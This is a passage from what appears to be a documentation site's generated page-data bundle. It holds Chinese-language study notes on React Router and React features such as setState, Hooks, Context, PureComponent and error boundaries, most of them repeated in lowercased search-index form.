activeclassname="active">repos</linknav>\n\n\n\n# activestyle\n\n如果希望当前的路由与其他路由有不同样式，这时可以使用link组件的activestyle属性。\n\n<linknav to="/about" activestyle={{color: \'red\'}}>about</linknav>\n<linknav to="/repos" activestyle={{color: \'red\'}}>repos</linknav>\n\n\n\n# exact\n\n<navlink\n  exact\n  to="/profile"\n>profile</navlink>\n\n\n\n# redirect\n\nredirect 是一个重定向的组件，有from 和to 两个属性，渲染时将导航到一个新地址，这个新地址覆盖在访问历史信息里面的本该访问的那个地址。\n\n例如：当我们修改路径后，我们可以做个重定向，当用户访问原先的地址的时候(404)，可以重定向到新地址。\n\n参数     类型       描述\nto     string   重定向的 url 字符串\nto     object   重定向的 location 对象\npush   bool     若为真，重定向操作将会把新地址加入到访问历史记录里面，并且无法回退到前面的页面。\nfrom   string   需要匹配的将要被重定向路径。\n\n<redirect from="string" to="string" />\n\n\n\n# param\n\nparam 通过 /:param 的方式传递参数\n\n\n<route path="new/:id" componet={news} />\n\n\n\n# switch组件\n\n使用方式：\n\nimport { switch } from "react-router-dom";\n\n<switch>\n    <route path="/" component={test1} />\n    <route path="/test" component={test2} />\n</switch>\n',charsets:{cjk:!0}},{title:"1. setState",frontmatter:{},regularPath:"/React/React%E6%89%A9%E5%B1%95/01-%E6%89%A9%E5%B1%95.html",relativePath:"React/React扩展/01-扩展.md",key:"v-d168f400",path:"/React/React%E6%89%A9%E5%B1%95/01-%E6%89%A9%E5%B1%95.html",headers:[{level:2,title:"1. setState",slug:"_1-setstate",normalizedTitle:"1. setstate",charIndex:2},{level:3,title:"setState更新状态的2种写法",slug:"setstate更新状态的2种写法",normalizedTitle:"setstate更新状态的2种写法",charIndex:18},{level:2,title:"2. lazyLoad",slug:"_2-lazyload",normalizedTitle:"2. lazyload",charIndex:637},{level:3,title:"路由组件的lazyLoad",slug:"路由组件的lazyload",normalizedTitle:"路由组件的lazyload",charIndex:653},{level:2,title:"3. Hooks",slug:"_3-hooks",normalizedTitle:"3. hooks",charIndex:1054},{level:2,title:"4. Fragment",slug:"_4-fragment",normalizedTitle:"4. fragment",charIndex:2332},{level:3,title:"使用",slug:"使用",normalizedTitle:"使用",charIndex:457},{level:3,title:"作用",slug:"作用",normalizedTitle:"作用",charIndex:1707},{level:2,title:"5. Context",slug:"_5-context",normalizedTitle:"5. context",charIndex:2456},{level:3,title:"理解",slug:"理解",normalizedTitle:"理解",charIndex:2471},{level:3,title:"使用",slug:"使用-2",normalizedTitle:"使用",charIndex:457},{level:3,title:"注意",slug:"注意",normalizedTitle:"注意",charIndex:2992},{level:2,title:"6. 组件优化",slug:"_6-组件优化",normalizedTitle:"6. 组件优化",charIndex:3078},{level:3,title:"Component的2个问题",slug:"component的2个问题",normalizedTitle:"component的2个问题",charIndex:3090},{level:3,title:"效率高的做法",slug:"效率高的做法",normalizedTitle:"效率高的做法",charIndex:3233},{level:3,title:"原因",slug:"原因",normalizedTitle:"原因",charIndex:3283},{level:3,title:"解决",slug:"解决",normalizedTitle:"解决",charIndex:3336},{level:2,title:"7. render props",slug:"_7-render-props",normalizedTitle:"7. render props",charIndex:3667},{level:3,title:"如何向组件内部动态传入带内容的结构(标签)?",slug:"如何向组件内部动态传入带内容的结构-标签",normalizedTitle:"如何向组件内部动态传入带内容的结构(标签)?",charIndex:3687},{level:3,title:"children props",slug:"children-props",normalizedTitle:"children props",charIndex:3768},{level:3,title:"render props",slug:"render-props",normalizedTitle:"render props",charIndex:3670},{level:2,title:"8. 错误边界",slug:"_8-错误边界",normalizedTitle:"8. 错误边界",charIndex:4130},{level:2,title:"9. 组件通信方式总结",slug:"_9-组件通信方式总结",normalizedTitle:"9. 组件通信方式总结",charIndex:4569}],headersStr:"1. setState setState更新状态的2种写法 2. lazyLoad 路由组件的lazyLoad 3. Hooks 4. Fragment 使用 作用 5. Context 理解 使用 注意 6. 组件优化 Component的2个问题 效率高的做法 原因 解决 7. render props 如何向组件内部动态传入带内容的结构(标签)? children props render props 8. 错误边界 9. 组件通信方式总结",content:'# 1. setState\n\n\n# setState更新状态的2种写法\n\n\t(1). setState(stateChange, [callback])------对象式的setState\n            1.stateChange为状态改变对象(该对象可以体现出状态的更改)\n            2.callback是可选的回调函数, 它在状态更新完毕、界面也更新后(render调用后)才被调用\n\t\t\t\t\t\n\t(2). setState(updater, [callback])------函数式的setState\n            1.updater为返回stateChange对象的函数。\n            2.updater可以接收到state和props。\n            4.callback是可选的回调函数, 它在状态更新、界面也更新后(render调用后)才被调用。\n总结:\n\t\t1.对象式的setState是函数式的setState的简写方式(语法糖)\n\t\t2.使用原则：\n\t\t\t\t(1).如果新状态不依赖于原状态 ===> 使用对象方式\n\t\t\t\t(2).如果新状态依赖于原状态 ===> 使用函数方式\n\t\t\t\t(3).如果需要在setState()执行后获取最新的状态数据, \n\t\t\t\t\t要在第二个callback函数中读取\n\n\n----------------------------------------\n\n\n# 2. lazyLoad\n\n\n# 路由组件的lazyLoad\n\n\t//1.通过React的lazy函数配合import()函数动态加载路由组件 ===> 路由组件代码会被分开打包\n\tconst Login = lazy(()=>import(\'@/pages/Login\'))\n\t\n\t//2.通过<Suspense>指定在加载得到路由打包文件前显示一个自定义loading界面\n\t<Suspense fallback={<h1>loading.....</h1>}>\n        <Switch>\n            <Route path="/xxx" component={Xxxx}/>\n            <Redirect to="/login"/>\n        </Switch>\n    </Suspense>\n\n\n----------------------------------------\n\n\n# 3. Hooks\n\n# 1. React Hook/Hooks是什么?\n\n(1). Hook是React 16.8.0版本增加的新特性/新语法\n(2). 可以让你在函数组件中使用 state 以及其他的 React 特性\n\n\n# 2. 三个常用的Hook\n\n(1). State Hook: React.useState()\n(2). Effect Hook: React.useEffect()\n(3). Ref Hook: React.useRef()\n\n\n# 3. State Hook\n\n(1). State Hook让函数组件也可以有state状态, 并进行状态数据的读写操作\n(2). 语法: const [xxx, setXxx] = React.useState(initValue)  \n(3). useState()说明:\n        参数: 第一次初始化指定的值在内部作缓存\n        返回值: 包含2个元素的数组, 第1个为内部当前状态值, 第2个为更新状态值的函数\n(4). setXxx()2种写法:\n        setXxx(newValue): 参数为非函数值, 直接指定新的状态值, 内部用其覆盖原来的状态值\n        setXxx(value => newValue): 参数为函数, 接收原本的状态值, 返回新的状态值, 内部用其覆盖原来的状态值\n\n\n# 4. Effect Hook\n\n(1). Effect Hook 可以让你在函数组件中执行副作用操作(用于模拟类组件中的生命周期钩子)\n(2). React中的副作用操作:\n        发ajax请求数据获取\n        设置订阅 / 启动定时器\n        手动更改真实DOM\n(3). 语法和说明: \n        useEffect(() => { \n          // 在此可以执行任何带副作用操作\n          return () => { // 在组件卸载前执行\n            // 在此做一些收尾工作, 比如清除定时器/取消订阅等\n          }\n        }, [stateValue]) // 如果指定的是[], 回调函数只会在第一次render()后执行\n    \n(4). 可以把 useEffect Hook 看做如下三个函数的组合\n        componentDidMount()\n        componentDidUpdate()\n    \tcomponentWillUnmount() \n\n\n# 5. Ref Hook\n\n(1). Ref Hook可以在函数组件中存储/查找组件内的标签或任意其它数据\n(2). 语法: const refContainer = useRef()\n(3). 作用:保存标签对象,功能与React.createRef()一样\n\n\n----------------------------------------\n\n\n# 4. Fragment\n\n\n# 使用\n\n<Fragment><Fragment>\n<></>\n\n\n\n# 作用\n\n> 可以不用必须有一个真实的DOM根标签了\n\n----------------------------------------\n\n\n# 5. Context\n\n\n# 理解\n\n> 一种组件间通信方式, 常用于【祖组件】与【后代组件】间通信\n\n\n# 使用\n\n1) 创建Context容器对象：\n\tconst XxxContext = React.createContext()  \n\t\n2) 渲染子组时，外面包裹xxxContext.Provider, 通过value属性给后代组件传递数据：\n\t<xxxContext.Provider value={数据}>\n\t\t子组件\n    </xxxContext.Provider>\n    \n3) 后代组件读取数据：\n\n\t//第一种方式:仅适用于类组件 \n\t  static contextType = xxxContext  // 声明接收context\n\t  this.context // 读取context中的value数据\n\t  \n\t//第二种方式: 函数组件与类组件都可以\n\t  <xxxContext.Consumer>\n\t    {\n\t      value => ( // value就是context中的value数据\n\t        要显示的内容\n\t      )\n\t    }\n\t  </xxxContext.Consumer>\n\n\n\n# 注意\n\n在应用开发中一般不用context, 一般都用它的封装react插件\n\n\n----------------------------------------\n\n\n# 6. 组件优化\n\n\n# Component的2个问题\n\n>  1. 只要执行setState(),即使不改变状态数据, 组件也会重新render() ==> 效率低\n> \n>  2. 只当前组件重新render(), 就会自动重新render子组件，纵使子组件没有用到父组件的任何数据 ==> 效率低\n\n\n# 效率高的做法\n\n> 只有当组件的state或props数据发生改变时才重新render()\n\n\n# 原因\n\n> Component中的shouldComponentUpdate()总是返回true\n\n\n# 解决\n\n办法1: \n\t重写shouldComponentUpdate()方法\n\t比较新旧state或props数据, 如果有变化才返回true, 如果没有返回false\n办法2:  \n\t使用PureComponent\n\tPureComponent重写了shouldComponentUpdate(), 只有state或props数据有变化才返回true\n\t注意: \n\t\t只是进行state和props数据的浅比较, 如果只是数据对象内部数据变了, 返回false  \n\t\t不要直接修改state数据, 而是要产生新数据\n项目中一般使用PureComponent来优化\n\n\n----------------------------------------\n\n\n# 7. render props\n\n\n# 如何向组件内部动态传入带内容的结构(标签)?\n\nVue中: \n\t使用slot技术, 也就是通过组件标签体传入结构  <A><B/></A>\nReact中:\n\t使用children props: 通过组件标签体传入结构\n\t使用render props: 通过组件标签属性传入结构,而且可以携带数据，一般用render函数属性\n\n\n\n# children props\n\n<A>\n  <B>xxxx</B>\n</A>\n{this.props.children}\n问题: 如果B组件需要A组件内的数据, ==> 做不到 \n\n\n\n# render props\n\n<A render={(data) => <C data={data}></C>}></A>\nA组件: {this.props.render(内部state数据)}\nC组件: 读取A组件传入的数据显示 {this.props.data} \n\n\n----------------------------------------\n\n\n# 8. 错误边界\n\n# 理解：\n\n错误边界(Error boundary)：用来捕获后代组件错误，渲染出备用页面\n\n# 特点：\n\n只能捕获后代组件生命周期产生的错误，不能捕获自己组件产生的错误和其他组件在合成事件、定时器中产生的错误\n\n# 使用方式：\n\ngetDerivedStateFromError配合componentDidCatch\n\n// 生命周期函数，一旦后台组件报错，就会触发\nstatic getDerivedStateFromError(error) {\n    console.log(error);\n    // 在render之前触发\n    // 返回新的state\n    return {\n        hasError: true,\n    };\n}\n\ncomponentDidCatch(error, info) {\n    // 统计页面的错误。发送请求发送到后台去\n    console.log(error, info);\n}\n\n\n\n# 9. 组件通信方式总结\n\n# 组件间的关系：\n\n * 父子组件\n * 兄弟组件（非嵌套组件）\n * 祖孙组件（跨级组件）\n\n# 几种通信方式：\n\n\t1.props：\n\t\t(1).children props\n\t\t(2).render props\n\t2.消息订阅-发布：\n\t\tpubs-sub、event等等\n\t3.集中式管理：\n\t\tredux、dva等等\n\t4.conText:\n\t\t生产者-消费者模式\n\n\n# 比较好的搭配方式：\n\n\t父子组件：props\n\t兄弟组件：消息订阅-发布、集中式管理\n\t祖孙组件(跨级组件)：消息订阅-发布、集中式管理、conText(开发用的少，封装插件用的多)\n',normalizedContent:'# 1. setstate\n\n\n# setstate更新状态的2种写法\n\n\t(1). setstate(statechange, [callback])------对象式的setstate\n            1.statechange为状态改变对象(该对象可以体现出状态的更改)\n            2.callback是可选的回调函数, 它在状态更新完毕、界面也更新后(render调用后)才被调用\n\t\t\t\t\t\n\t(2). setstate(updater, [callback])------函数式的setstate\n            1.updater为返回statechange对象的函数。\n            2.updater可以接收到state和props。\n            4.callback是可选的回调函数, 它在状态更新、界面也更新后(render调用后)才被调用。\n总结:\n\t\t1.对象式的setstate是函数式的setstate的简写方式(语法糖)\n\t\t2.使用原则：\n\t\t\t\t(1).如果新状态不依赖于原状态 ===> 使用对象方式\n\t\t\t\t(2).如果新状态依赖于原状态 ===> 使用函数方式\n\t\t\t\t(3).如果需要在setstate()执行后获取最新的状态数据, \n\t\t\t\t\t要在第二个callback函数中读取\n\n\n----------------------------------------\n\n\n# 2. lazyload\n\n\n# 路由组件的lazyload\n\n\t//1.通过react的lazy函数配合import()函数动态加载路由组件 ===> 路由组件代码会被分开打包\n\tconst login = lazy(()=>import(\'@/pages/login\'))\n\t\n\t//2.通过<suspense>指定在加载得到路由打包文件前显示一个自定义loading界面\n\t<suspense fallback={<h1>loading.....</h1>}>\n        <switch>\n            <route path="/xxx" component={xxxx}/>\n            <redirect to="/login"/>\n        </switch>\n    </suspense>\n\n\n----------------------------------------\n\n\n# 3. hooks\n\n# 1. react hook/hooks是什么?\n\n(1). hook是react 16.8.0版本增加的新特性/新语法\n(2). 可以让你在函数组件中使用 state 以及其他的 react 特性\n\n\n# 2. 三个常用的hook\n\n(1). state hook: react.usestate()\n(2). effect hook: react.useeffect()\n(3). ref hook: react.useref()\n\n\n# 3. state hook\n\n(1). state hook让函数组件也可以有state状态, 并进行状态数据的读写操作\n(2). 语法: const [xxx, setxxx] = react.usestate(initvalue)  \n(3). usestate()说明:\n        参数: 第一次初始化指定的值在内部作缓存\n        返回值: 包含2个元素的数组, 第1个为内部当前状态值, 第2个为更新状态值的函数\n(4). setxxx()2种写法:\n        setxxx(newvalue): 参数为非函数值, 直接指定新的状态值, 内部用其覆盖原来的状态值\n        setxxx(value => newvalue): 参数为函数, 接收原本的状态值, 返回新的状态值, 内部用其覆盖原来的状态值\n\n\n# 4. effect hook\n\n(1). effect hook 可以让你在函数组件中执行副作用操作(用于模拟类组件中的生命周期钩子)\n(2). react中的副作用操作:\n        发ajax请求数据获取\n        设置订阅 / 启动定时器\n        手动更改真实dom\n(3). 语法和说明: \n        useeffect(() => { \n          // 在此可以执行任何带副作用操作\n          return () => { // 在组件卸载前执行\n            // 在此做一些收尾工作, 比如清除定时器/取消订阅等\n          }\n        }, [statevalue]) // 如果指定的是[], 回调函数只会在第一次render()后执行\n    \n(4). 可以把 useeffect hook 看做如下三个函数的组合\n        componentdidmount()\n        componentdidupdate()\n    \tcomponentwillunmount() \n\n\n# 5. ref hook\n\n(1). ref hook可以在函数组件中存储/查找组件内的标签或任意其它数据\n(2). 语法: const refcontainer = useref()\n(3). 作用:保存标签对象,功能与react.createref()一样\n\n\n----------------------------------------\n\n\n# 4. fragment\n\n\n# 使用\n\n<fragment><fragment>\n<></>\n\n\n\n# 作用\n\n> 可以不用必须有一个真实的dom根标签了\n\n----------------------------------------\n\n\n# 5. context\n\n\n# 理解\n\n> 一种组件间通信方式, 常用于【祖组件】与【后代组件】间通信\n\n\n# 使用\n\n1) 创建context容器对象：\n\tconst xxxcontext = react.createcontext()  \n\t\n2) 渲染子组时，外面包裹xxxcontext.provider, 通过value属性给后代组件传递数据：\n\t<xxxcontext.provider value={数据}>\n\t\t子组件\n    </xxxcontext.provider>\n    \n3) 后代组件读取数据：\n\n\t//第一种方式:仅适用于类组件 \n\t  static contexttype = xxxcontext  // 声明接收context\n\t  this.context // 读取context中的value数据\n\t  \n\t//第二种方式: 函数组件与类组件都可以\n\t  <xxxcontext.consumer>\n\t    {\n\t      value => ( // value就是context中的value数据\n\t        要显示的内容\n\t      )\n\t    }\n\t  </xxxcontext.consumer>\n\n\n\n# 注意\n\n在应用开发中一般不用context, 一般都用它的封装react插件\n\n\n----------------------------------------\n\n\n# 6. 组件优化\n\n\n# component的2个问题\n\n>  1. 只要执行setstate(),即使不改变状态数据, 组件也会重新render() ==> 效率低\n> \n>  2. 只当前组件重新render(), 就会自动重新render子组件，纵使子组件没有用到父组件的任何数据 ==> 效率低\n\n\n# 效率高的做法\n\n> 只有当组件的state或props数据发生改变时才重新render()\n\n\n# 原因\n\n> component中的shouldcomponentupdate()总是返回true\n\n\n# 解决\n\n办法1: \n\t重写shouldcomponentupdate()方法\n\t比较新旧state或props数据, 如果有变化才返回true, 如果没有返回false\n办法2:  \n\t使用purecomponent\n\tpurecomponent重写了shouldcomponentupdate(), 只有state或props数据有变化才返回true\n\t注意: \n\t\t只是进行state和props数据的浅比较, 如果只是数据对象内部数据变了, 返回false  \n\t\t不要直接修改state数据, 而是要产生新数据\n项目中一般使用purecomponent来优化\n\n\n----------------------------------------\n\n\n# 7. render props\n\n\n# 如何向组件内部动态传入带内容的结构(标签)?\n\nvue中: \n\t使用slot技术, 也就是通过组件标签体传入结构  <a><b/></a>\nreact中:\n\t使用children props: 通过组件标签体传入结构\n\t使用render props: 通过组件标签属性传入结构,而且可以携带数据，一般用render函数属性\n\n\n\n# children props\n\n<a>\n  <b>xxxx</b>\n</a>\n{this.props.children}\n问题: 如果b组件需要a组件内的数据, ==> 做不到 \n\n\n\n# render props\n\n<a render={(data) => <c data={data}></c>}></a>\na组件: {this.props.render(内部state数据)}\nc组件: 读取a组件传入的数据显示 {this.props.data} \n\n\n----------------------------------------\n\n\n# 8. 错误边界\n\n# 理解：\n\n错误边界(error boundary)：用来捕获后代组件错误，渲染出备用页面\n\n# 特点：\n\n只能捕获后代组件生命周期产生的错误，不能捕获自己组件产生的错误和其他组件在合成事件、定时器中产生的错误\n\n# 使用方式：\n\ngetderivedstatefromerror配合componentdidcatch\n\n// 生命周期函数，一旦后台组件报错，就会触发\nstatic getderivedstatefromerror(error) {\n    console.log(error);\n    // 在render之前触发\n    // 返回新的state\n    return {\n        haserror: true,\n    };\n}\n\ncomponentdidcatch(error, info) {\n    // 统计页面的错误。发送请求发送到后台去\n    console.log(error, info);\n}\n\n\n\n# 9. 组件通信方式总结\n\n# 组件间的关系：\n\n * 父子组件\n * 兄弟组件（非嵌套组件）\n * 祖孙组件（跨级组件）\n\n# 几种通信方式：\n\n\t1.props：\n\t\t(1).children props\n\t\t(2).render props\n\t2.消息订阅-发布：\n\t\tpubs-sub、event等等\n\t3.集中式管理：\n\t\tredux、dva等等\n\t4.context:\n\t\t生产者-消费者模式\n\n\n# 比较好的搭配方式：\n\n\t父子组件：props\n\t兄弟组件：消息订阅-发布、集中式管理\n\t祖孙组件(跨级组件)：消息订阅-发布、集中式管理、context(开发用的少，封装插件用的多)\n',charsets:{cjk:!0}},{title:"ReactRouter示例",frontmatter:{},regularPath:"/React/React%E8%B7%AF%E7%94%B1/05-ReactRouter%E7%A4%BA%E4%BE%8B.html",relativePath:"React/React路由/05-ReactRouter示例.md",key:"v-45c6de1a",path:"/React/React%E8%B7%AF%E7%94%B1/05-ReactRouter%E7%A4%BA%E4%BE%8B.html",headers:[{level:2,title:"基本使用",slug:"基本使用",normalizedTitle:"基本使用",charIndex:20},{level:2,title:"向路由组件传递参数",slug:"向路由组件传递参数",normalizedTitle:"向路由组件传递参数",charIndex:1141},{level:2,title:"withRouter",slug:"withrouter",normalizedTitle:"withrouter",charIndex:2638}],headersStr:"基本使用 向路由组件传递参数 withRouter",content:'# ReactRouter示例\n\n\n# 基本使用\n\nimport React,{ Component } from \'react\';\nimport ReactDOM from \'react-dom\';\nimport {\n    HashRouter as Router, //BrowserRouter 与 HashRouter 使用其中一个\n    Route,\n    Link,\n} from \'react-router-dom\';\n\nclass App extends Component{...}\nclass Home extends Component{...}\nclass About extends Component{...}\nclass News extends Component{...}\n\nReact.render(\n\t<Router>\n        <App>\n            <nav>\n                <Link to="/">Home</Link>\n                <Link to="/about">About</Link>\n                <Link to="/news">News</Link>\n            </nav>\n            <div>\n                <Route path="/" component={Home} />\n                <Route path="/about" component={About} />\n                <Route path="/news" component={News} />\n            </div>\n        </App>\n\t</Router>\n\t,document.querySelector(\'#app\')\n)\n\n\nApp组件中可以添加一些，所有页面共有的组件或内容。\n\n路由容器组件\n\n< Router >\n    ...\n    <\n    /Router>\n\n\n路由\n\n<div>\n    # 当路径为 / 加载 Home组件\n    <Route path="/" component={Home} />\n\n    # 当路径为 /about 加载 About组件\n    <Route path="/about" component={About} />\n\n    # 当路径为 /news 加载 News组件\n    <Route path="/news" component={News} />\n</div>\n\n\n\n# 向路由组件传递参数\n\n\n<div>\n  <ul>\n    {\n      messageArr.map((msgObj)=>{\n        return (\n          <li key={msgObj.id}>\n            {/* 向路由组件传递params参数 */}\n            {/* <Link to={`/home/message/detail/${msgObj.id}/${msgObj.title}`}>{msgObj.title}</Link> */}\n\n            {/* 向路由组件传递search参数 */}\n            {/* <Link to={`/home/message/detail/?id=${msgObj.id}&title=${msgObj.title}`}>{msgObj.title}</Link> */}\n\n            {/* 向路由组件传递state参数 */}\n            <Link to={{pathname:\'/home/message/detail\',state:{id:msgObj.id,title:msgObj.title}}}>{msgObj.title}</Link>\n          </li>\n        )\n      })\n    }\n  </ul>\n  <hr/>\n  {/* 声明接收params参数 */}\n  {/* <Route path="/home/message/detail/:id/:title" component={Detail}/> */}\n\n  {/* search参数无需声明接收，正常注册路由即可 */}\n  {/* <Route path="/home/message/detail" component={Detail}/> */}\n\n  {/* state参数无需声明接收，正常注册路由即可 */}\n  {/* <Route path="/home/message/detail" component={Detail}/> */}\n</div>\n/**detail 组件**/\nexport default class Detail extends Component {\n  render() {\n\n  // 接收params参数\n  // const {id,title} = this.props.match.params \n\n  // 接收search参数\n  // const {search} = this.props.location\n  // const {id,title} = qs.parse(search.slice(1))\n\n  // 接收state参数\n  const {id,title} = this.props.location.state || {}\n    const findResult = DetailData.find((detailObj)=>{\n      return detailObj.id === id\n    })\n    return (\n      <ul>\n        <li>ID:{id}</li>\n        <li>TITLE:{title}</li>\n        <li>CONTENT:{findResult.content}</li>\n      </ul>\n    )\n  }\n}\n\n\n\n\n\n# withRouter\n\nWARNING\n\n//withRouter可以加工一般组件，让一般组件具备路由组件所特有的API //withRouter的返回值是一个新组件\n\nexport default withRouter(Header)\n',normalizedContent:'# reactrouter示例\n\n\n# 基本使用\n\nimport react,{ component } from \'react\';\nimport reactdom from \'react-dom\';\nimport {\n    hashrouter as router, //browserrouter 与 hashrouter 使用其中一个\n    route,\n    link,\n} from \'react-router-dom\';\n\nclass app extends component{...}\nclass home extends component{...}\nclass about extends component{...}\nclass news extends component{...}\n\nreact.render(\n\t<router>\n        <app>\n            <nav>\n                <link to="/">home</link>\n                <link to="/about">about</link>\n                <link to="/news">news</link>\n            </nav>\n            <div>\n                <route path="/" component={home} />\n                <route path="/about" component={about} />\n                <route path="/news" component={news} />\n            </div>\n        </app>\n\t</router>\n\t,document.queryselector(\'#app\')\n)\n\n\napp组件中可以添加一些，所有页面共有的组件或内容。\n\n路由容器组件\n\n< router >\n    ...\n    <\n    /router>\n\n\n路由\n\n<div>\n    # 当路径为 / 加载 home组件\n    <route path="/" component={home} />\n\n    # 当路径为 /about 加载 about组件\n    <route path="/about" component={about} />\n\n    # 当路径为 /news 加载 news组件\n    <route path="/news" component={news} />\n</div>\n\n\n\n# 向路由组件传递参数\n\n\n<div>\n  <ul>\n    {\n      messagearr.map((msgobj)=>{\n        return (\n          <li key={msgobj.id}>\n            {/* 向路由组件传递params参数 */}\n            {/* <link to={`/home/message/detail/${msgobj.id}/${msgobj.title}`}>{msgobj.title}</link> */}\n\n            {/* 向路由组件传递search参数 */}\n            {/* <link to={`/home/message/detail/?id=${msgobj.id}&title=${msgobj.title}`}>{msgobj.title}</link> */}\n\n            {/* 向路由组件传递state参数 */}\n            <link to={{pathname:\'/home/message/detail\',state:{id:msgobj.id,title:msgobj.title}}}>{msgobj.title}</link>\n          </li>\n        )\n      })\n    }\n  </ul>\n  <hr/>\n  {/* 声明接收params参数 */}\n  {/* <route path="/home/message/detail/:id/:title" component={detail}/> */}\n\n  {/* search参数无需声明接收，正常注册路由即可 */}\n  {/* <route path="/home/message/detail" component={detail}/> */}\n\n  {/* state参数无需声明接收，正常注册路由即可 */}\n  {/* <route path="/home/message/detail" component={detail}/> */}\n</div>\n/**detail 组件**/\nexport default class detail extends component {\n  render() {\n\n  // 接收params参数\n  // const {id,title} = this.props.match.params \n\n  // 接收search参数\n  // const {search} = this.props.location\n  // const {id,title} = qs.parse(search.slice(1))\n\n  // 接收state参数\n  const {id,title} = this.props.location.state || {}\n    const findresult = detaildata.find((detailobj)=>{\n      return detailobj.id === id\n    })\n    return (\n      <ul>\n        <li>id:{id}</li>\n        <li>title:{title}</li>\n        <li>content:{findresult.content}</li>\n      </ul>\n    )\n  }\n}\n\n\n\n\n\n# withrouter\n\nwarning\n\n//withrouter可以加工一般组件，让一般组件具备路由组件所特有的api //withrouter的返回值是一个新组件\n\nexport default withrouter(header)\n',charsets:{cjk:!0}},{title:"ReactRouter对象",frontmatter:{},regularPath:"/React/React%E8%B7%AF%E7%94%B1/04-ReactRouter%E5%AF%B9%E8%B1%A1.html",relativePath:"React/React路由/04-ReactRouter对象.md",key:"v-48455a8b",path:"/React/React%E8%B7%AF%E7%94%B1/04-ReactRouter%E5%AF%B9%E8%B1%A1.html",headers:[{level:2,title:"history",slug:"history",normalizedTitle:"history",charIndex:20},{level:2,title:"location",slug:"location",normalizedTitle:"location",charIndex:213},{level:2,title:"match",slug:"match",normalizedTitle:"match",charIndex:1506}],headersStr:"history location match",content:"# ReactRouter对象\n\n\n# history\n\nhistory 对象通常具有以下属性和方法：\n\n参数                       类型         描述\nlength                   number     浏览历史堆栈中的条目数\naction                   string     路由跳转到当前页面执行的动作，分为 PUSH, REPLACE, POP\nlocation                 object     当前访问地址信息组成的对象，具有如下属性：\nlocation.pathname        string     URL路径\nlocation.search          string     URL中的查询字符串\nlocation.hash            string     URL的 hash 片段\nlocation.state           string     例如执行 push(path, state) 操作时，location 的 state 将被提供到堆栈信息里，state\n                                    只有在 browser 和 memory history 有效。\npush(path, [state])      function   在历史堆栈信息里加入一个新条目。\nreplace(path, [state])   function   在历史堆栈信息里替换掉当前的条目\ngo(n)                    function   将 history 堆栈中的指针向前移动 n。\ngoBack()                 function   等同于 go(-1)\ngoForward()              function   等同于 go(1)\nblock(prompt)            function   阻止跳转\n\n在组件中使用js跳转\n\nclass ToHomeButton extends React.Component{\n    render(){\n        return <button onClick={this.handleClick.bind(this)}>首页</button>\n    }\n    handleClick(){\n        //使用 this.props.history.push(path) 进行跳转\n        this.props.history.push('/');\n    }\n}\n\n\n\n# location\n\nlocation 是指你当前的位置，将要去的位置，或是之前所在的位置\n\n{\n  key: 'sdfad1'\n  pathname: '/about',\n  search: '?name=minooo'\n  hash: '#sdfas',\n  state: {\n    price: 123\n  }\n}\n\n\nrouter 将在这几个地方为您提供一个 location 对象：\n\n * Route component as this.props.location\n * Route render as ({ location }) => ()\n * Route children as ({ location }) => ()\n * withRouter as this.props.location\n\n\n# match\n\nmatch 对象包含了 <Route path> 如何与 URL 匹配的信息，具有以下属性：\n\n参数        类型       描述\nparams    object   路径参数，通过解析 URL 中的动态部分获得键值对\nisExact   bool     为 true 时，整个 URL 都需要匹配\npath      string   用来匹配的路径模式，用于创建嵌套的 <Route>\nurl       string   URL 匹配的部分，用于嵌套的 <Link>",normalizedContent:"# reactrouter对象\n\n\n# history\n\nhistory 对象通常具有以下属性和方法：\n\n参数                       类型         描述\nlength                   number     浏览历史堆栈中的条目数\naction                   string     路由跳转到当前页面执行的动作，分为 push, replace, pop\nlocation                 object     当前访问地址信息组成的对象，具有如下属性：\nlocation.pathname        string     url路径\nlocation.search          string     url中的查询字符串\nlocation.hash            string     url的 hash 片段\nlocation.state           string     例如执行 push(path, state) 操作时，location 的 state 将被提供到堆栈信息里，state\n                                    只有在 browser 和 memory history 有效。\npush(path, [state])      function   在历史堆栈信息里加入一个新条目。\nreplace(path, [state])   function   在历史堆栈信息里替换掉当前的条目\ngo(n)                    function   将 history 堆栈中的指针向前移动 n。\ngoback()                 function   等同于 go(-1)\ngoforward()              function   等同于 go(1)\nblock(prompt)            function   阻止跳转\n\n在组件中使用js跳转\n\nclass tohomebutton extends react.component{\n    render(){\n        return <button onclick={this.handleclick.bind(this)}>首页</button>\n    }\n    handleclick(){\n        //使用 this.props.history.push(path) 进行跳转\n        this.props.history.push('/');\n    }\n}\n\n\n\n# location\n\nlocation 是指你当前的位置，将要去的位置，或是之前所在的位置\n\n{\n  key: 'sdfad1'\n  pathname: '/about',\n  search: '?name=minooo'\n  hash: '#sdfas',\n  state: {\n    price: 123\n  }\n}\n\n\nrouter 将在这几个地方为您提供一个 location 对象：\n\n * route component as this.props.location\n * route render as ({ location }) => ()\n * route children as ({ location }) => ()\n * withrouter as this.props.location\n\n\n# match\n\nmatch 对象包含了 <route path> 如何与 url 匹配的信息，具有以下属性：\n\n参数        类型       描述\nparams    object   路径参数，通过解析 url 中的动态部分获得键值对\nisexact   bool     为 true 时，整个 url 都需要匹配\npath      string   用来匹配的路径模式，用于创建嵌套的 <route>\nurl       string   url 匹配的部分，用于嵌套的 <link>",charsets:{cjk:!0}},{title:"ReactRouter安装",frontmatter:{},regularPath:"/React/React%E8%B7%AF%E7%94%B1/02-ReactRouter%E5%AE%89%E8%A3%85.html",relativePath:"React/React路由/02-ReactRouter安装.md",key:"v-4460ac7c",path:"/React/React%E8%B7%AF%E7%94%B1/02-ReactRouter%E5%AE%89%E8%A3%85.html",headers:[{level:3,title:"安装 react-router-dom",slug:"安装-react-router-dom",normalizedTitle:"安装 react-router-dom",charIndex:191}],headersStr:"安装 react-router-dom",content:"# ReactRouter安装\n\n库名称                   描述                               版本\nreact-router-dom      用于浏览器端 React Router              \nreact-router-native   用于 React Native 的 React Router   \n\n\n# 安装 react-router-dom\n\n首先通过 npm 安装(ReactRouterV4)：\n\nnpm install --save react-router-dom\n\n\n然后使用一个支持 CommonJS 或 ES6 的模块管理器，例如 webpack：\n\n# CJS\nconst ReactRouter = require(\"react-router-dom\")\nconst {BrowserRouter,Route,Link} = ReactRouter;\n\n# ES6\nimport {\n  BrowserRouter,\n  HashRouter,\n  Route,\n  Link,\n  NavLink\n} from 'react-router-dom'\n",normalizedContent:"# reactrouter安装\n\n库名称                   描述                               版本\nreact-router-dom      用于浏览器端 react router              \nreact-router-native   用于 react native 的 react router   \n\n\n# 安装 react-router-dom\n\n首先通过 npm 安装(reactrouterv4)：\n\nnpm install --save react-router-dom\n\n\n然后使用一个支持 